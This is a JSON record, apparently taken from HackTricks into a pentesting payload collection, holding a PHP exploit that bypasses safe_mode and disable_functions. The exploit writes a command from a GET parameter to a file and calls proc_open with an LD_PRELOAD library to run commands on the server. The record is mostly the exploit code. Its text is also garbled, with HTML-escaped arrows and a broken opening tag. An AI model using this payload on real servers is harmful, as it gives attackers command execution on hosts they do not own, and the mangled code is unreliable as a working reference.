{
  "id": "network_services_pentesting_31b2396be659",
  "category": "network-services-pentesting",
  "title": "disable functions bypass php safe mode bypass via proc open and custom environment exploit",
  "description": "# PHP safe_mode bypass via proc_open and custom environment Exploit\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\n```php\n<!--p $path=\"/var/www\"; //change to your writable path $a=fopen($path.\"/.comm\",\"w\"); fputs($a,$_GET[\"c\"]); fclose($a); $descriptorspec = array(  0--> array(\"pipe\", \"r\"),\n 1 =&gt; array(\"file\", $path.\"/output.txt\",\"w\"),\n 2 =&gt; array(",
  "payloads": [
    "# PHP safe_mode bypass via proc_open and custom environment Exploit",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)",
    "```php",
    "<!--p $path=\"/var/www\"; //change to your writable path $a=fopen($path.\"/.comm\",\"w\"); fputs($a,$_GET[\"c\"]); fclose($a); $descriptorspec = array(  0--> array(\"pipe\", \"r\"),",
    "1 =&gt; array(\"file\", $path.\"/output.txt\",\"w\"),",
    "2 =&gt; array(\"file\", $path.\"/errors.txt\", \"a\" )",
    "); $cwd = '.'; $env = array('LD_PRELOAD' =&gt; $path.\"/a.so\"); $process = proc_open('id &gt; /tmp/a', $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed sleep(1); $a=fopen($path.\"/.comm1\",\"r\");",
    "echo \"<strong>\";",
    "while (!feof($a))",
    "{$b=fgets($a);echo $b;} fclose($a);",
    "?&gt;;",
    "</strong>",
    "{{#include ../../../../banners/hacktricks-training.md}}"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-safe_mode-bypass-via-proc_open-and-custom-environment-exploit.md"
  ]
}